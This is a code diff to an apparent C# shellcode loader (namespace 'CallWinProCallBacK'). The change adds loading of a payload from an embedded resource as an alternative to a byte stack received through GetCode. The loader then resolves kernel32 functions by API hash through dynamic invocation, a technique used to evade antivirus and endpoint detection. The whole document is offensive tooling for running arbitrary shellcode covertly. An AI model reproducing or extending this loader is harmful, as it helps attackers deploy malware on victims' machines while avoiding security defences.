@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
@@ -9,21 +11,28 @@ namespace CallWinProCallBacK
 {
     class Execute
     {
-
+        public static byte[] buf;
         public static void Exec()
         {
-            //3d4f0f8e
-            Stack<byte> recvStack = GetCode.CodeStack();
-            byte[] buf = new byte[recvStack.Count];
-            int payloadLen = recvStack.Count;
-            for (int i = 0; i <= payloadLen; i++)
+            if (GetCode.UseRaw == true)
             {
-                try
+                buf = GetEmbeddedBin("dotnetlib");
+            }
+            else
+            {
+                //3d4f0f8e
+                Stack<byte> recvStack = GetCode.CodeStack();
+                buf = new byte[recvStack.Count];
+                int payloadLen = recvStack.Count;
+                for (int i = 0; i <= payloadLen; i++)
                 {
-                    buf[i] = recvStack.Pop();
-                }
-                catch { break; }
+                    try
+                    {
+                        buf[i] = recvStack.Pop();
+                    }
+                    catch { break; }
 
+                }
             }
             IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
             IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
@@ -75,6 +84,27 @@ namespace CallWinProCallBacK
             PAGE_GUARD = 0x00000100,
             PAGE_NOCACHE = 0x00000200,
             PAGE_WRITECOMBINE = 0x00000400
+        }
+        public static byte[] GetEmbeddedBin(string resourcesName)
+        {
+
+            var EmbeddedRes = Assembly.GetExecutingAssembly();
+            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
+            {
+                if (rs != null)
+                {
+                    using (var ms = new MemoryStream())
+                    {
+                        rs.CopyTo(ms);
+                        return ms.ToArray();
+                    }
+                }
+                else
+                {
+                    return null;
+                }
+
+            }
         }
     }
 }
